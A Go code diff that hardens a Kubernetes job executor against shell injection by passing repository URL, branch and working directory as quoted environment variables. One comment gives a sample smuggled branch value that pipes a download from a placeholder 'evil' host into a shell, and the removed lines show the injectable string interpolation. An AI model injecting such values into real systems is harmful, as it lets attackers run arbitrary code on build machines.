@@ -80,6 +80,13 @@ func (e *KubernetesExecutor) Execute(ctx context.Context, params ExecuteParams) 
 		{Name: "TF_INPUT", Value: "false"},
 		{Name: "PORTAL_RUN_ID", Value: params.RunID},
 		{Name: "PORTAL_OPERATION", Value: params.Operation},
+		// Repo URL / branch / working dir are passed as env vars (never inlined
+		// into run.sh) so the script can reference them as quoted "$VAR" — a
+		// branch or working_dir containing shell metacharacters is then a
+		// literal value to git/cd, not executable shell. See buildScript.
+		{Name: "PORTAL_REPO_URL", Value: params.RepoURL},
+		{Name: "PORTAL_REPO_BRANCH", Value: params.RepoBranch},
+		{Name: "PORTAL_WORKING_DIR", Value: params.WorkingDir},
 		// Terragrunt-specific defaults. Harmless for tofu runs (tofu
 		// ignores TG_*-prefixed env vars). See local.go for rationale.
 		{Name: "TG_NON_INTERACTIVE", Value: "true"},
@@ -141,7 +148,7 @@ func (e *KubernetesExecutor) Execute(ctx context.Context, params ExecuteParams) 
 			Namespace: e.namespace,
 			Labels: map[string]string{
 				"app.kubernetes.io/managed-by": "portal",
-				"portal/run-id":                 params.RunID,
+				"portal/run-id":                params.RunID,
 			},
 		},
 		Data: cmData,
@@ -250,16 +257,22 @@ func (e *KubernetesExecutor) buildScript(params ExecuteParams) string {
 
 	sb.WriteString("#!/bin/sh\nset -e\n\n")
 
-	// Get source: clone repo or extract uploaded archive
+	// Get source: clone repo or extract uploaded archive.
+	//
+	// RepoURL/RepoBranch/WorkingDir are referenced as quoted shell variables
+	// (PORTAL_* env vars set on the container), never interpolated into the
+	// script text — so a value like `main;curl evil|sh` is passed verbatim to
+	// git/cd instead of being parsed as shell. The `--branch=` form and the `--`
+	// separator also stop a leading-dash value from being read as a git option.
 	if params.Source == "upload" {
 		sb.WriteString("echo 'Extracting uploaded configuration...'\n")
 		sb.WriteString("cd /work\n")
 		sb.WriteString("tar xzf /config/source.tar.gz\n")
-		sb.WriteString(fmt.Sprintf("cd /work/%s\n\n", params.WorkingDir))
+		sb.WriteString("cd \"/work/$PORTAL_WORKING_DIR\"\n\n")
 	} else {
-		sb.WriteString(fmt.Sprintf("echo 'Cloning %s (branch: %s)...'\n", params.RepoURL, params.RepoBranch))
-		sb.WriteString(fmt.Sprintf("git clone --depth 1 --branch %s %s /work\n", params.RepoBranch, params.RepoURL))
-		sb.WriteString(fmt.Sprintf("cd /work/%s\n\n", params.WorkingDir))
+		sb.WriteString("echo \"Cloning $PORTAL_REPO_URL (branch: $PORTAL_REPO_BRANCH)...\"\n")
+		sb.WriteString("git clone --depth 1 --branch=\"$PORTAL_REPO_BRANCH\" -- \"$PORTAL_REPO_URL\" /work\n")
+		sb.WriteString("cd \"/work/$PORTAL_WORKING_DIR\"\n\n")
 	}
 
 	// Detect wrapper. terragrunt.hcl at the leaf → terragrunt drives the run
@@ -403,9 +416,9 @@ func (e *KubernetesExecutor) buildPod(name string, params ExecuteParams, envVars
 			Labels: map[string]string{
 				"app.kubernetes.io/managed-by": "portal",
 				"app.kubernetes.io/component":  "executor",
-				"portal/run-id":                 params.RunID,
-				"portal/workspace-id":           params.WorkspaceID,
-				"portal/operation":              params.Operation,
+				"portal/run-id":                params.RunID,
+				"portal/workspace-id":          params.WorkspaceID,
+				"portal/operation":             params.Operation,
 			},
 		},
 		Spec: corev1.PodSpec{
